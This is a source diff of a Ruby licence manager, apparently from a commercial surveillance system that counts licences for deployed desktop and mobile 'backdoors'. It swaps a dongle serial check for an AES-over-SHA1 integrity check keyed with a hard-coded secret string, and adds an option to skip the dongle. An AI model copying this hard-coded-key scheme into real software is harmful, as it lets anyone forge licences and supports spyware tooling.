@@ -1,3 +1,4 @@
+# encoding: utf-8
 #
 #  License handling stuff
 #
@@ -7,6 +8,7 @@ require_relative 'dongle.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/crypt'
 
 # system
 require 'yaml'
@@ -19,6 +21,7 @@ module DB
 class LicenseManager
   include Singleton
   include RCS::Tracer
+  include RCS::Crypt
 
   LICENSE_VERSION = '8.0'
   LICENSE_FILE = 'rcs.lic'
@@ -52,16 +55,7 @@ class LicenseManager
   end
 
   def load_license
-    trace :info, "Checking for hardware dongle..."
 
-    begin
-      # get the version from the dongle (can rise exception)
-      serial = Dongle.serial
-    rescue Exception => e
-      trace :fatal, e.message
-      exit
-    end
-    
     # load the license file
     lic_file = File.join Dir.pwd, Config::CONF_DIR, LICENSE_FILE
 
@@ -70,15 +64,21 @@ class LicenseManager
 
       File.open(lic_file, "r") do |f|
         lic = YAML.load(f.read)
-        # TODO: check the crypto signature
 
-        if lic[:serial] != serial
-          trace :fatal, 'Invalid License File: incorrect serial number'
+        # check the autenticity of the license
+        unless crypt_check(lic)
+          trace :fatal, 'Invalid License File: corrupted integrity check'
           exit
         end
 
+        # the license is not for this version
         if lic[:version] != LICENSE_VERSION
           trace :fatal, 'Invalid License File: incorrect version'
+          exit
+        end
+
+        if not lic[:expiry].nil? and Time.parse(lic[:expiry]).getutc < Dongle.time
+          trace :fatal, "Invalid License File: license expired on #{Time.parse(lic[:expiry]).getutc}"
           exit
         end
 
@@ -92,6 +92,21 @@ class LicenseManager
     # sanity check
     if @limits[:backdoors][:total] < @limits[:backdoors][:desktop] or @limits[:backdoors][:total] < @limits[:backdoors][:mobile]
       trace :fatal, 'Invalid License File: total is lower than desktop or mobile'
+      exit
+    end
+
+    begin
+      if @limits[:serial] != 'off'
+        trace :info, "Checking for hardware dongle..."
+        # get the version from the dongle (can rise exception)
+        if @limits[:serial] != Dongle.serial
+          raise 'Invalid License File: incorrect serial number'
+        end
+      else
+        trace :info, "Hardware dongle not required..."
+      end
+    rescue Exception => e
+      trace :fatal, e.message
       exit
     end
 
@@ -131,7 +146,7 @@ class LicenseManager
   def burn_one_license(type, platform)
 
     # check if the platform can be used
-    unless @limit[:backdoors][platform]
+    unless @limits[:backdoors][platform]
       trace :warn, "You don't have a license for #{platform.to_s}. Queuing..."
       return false
     end
@@ -147,9 +162,11 @@ class LicenseManager
         return false
       end
       if type == :desktop and desktop < @limits[:backdoors][:desktop]
+        trace :info, "Using a reusable license: #{type.to_s} #{platform.to_s}"
         return true
       end
       if type == :mobile and mobile < @limits[:backdoors][:mobile]
+        trace :info, "Using a reusable license: #{type.to_s} #{platform.to_s}"
         return true
       end
 
@@ -161,7 +178,7 @@ class LicenseManager
 
       # do we have available license on the dongle?
       if Dongle.count > 0
-        trace :info, "Using a permanent license: #{type.to_s} #{platform.to_s}"
+        trace :info, "Using a oneshot license: #{type.to_s} #{platform.to_s}"
         Dongle.decrement
         return true
       else
@@ -273,8 +290,18 @@ class LicenseManager
       trace :warn, "Queuing backdoor '#{offending[:name]}' #{offending[:desc]}"
       offending.save
     end
-
   end
+
+
+  def crypt_check(hash)
+    # calculate the check on the whole hash except the :integrity field itself
+    content = hash.reject {|k,v| k == :integrity}.to_s
+    # calculate the encrypted SHA1
+    check = aes_encrypt(Digest::SHA1.digest(content), Digest::SHA1.digest("€ ∫∑x=1 ∆t π™")).unpack('H*').first
+    #trace :debug, check
+    return hash[:integrity] == check
+  end
+
 
   def counters
     counters = {:users => User.count(conditions: {enabled: true}),
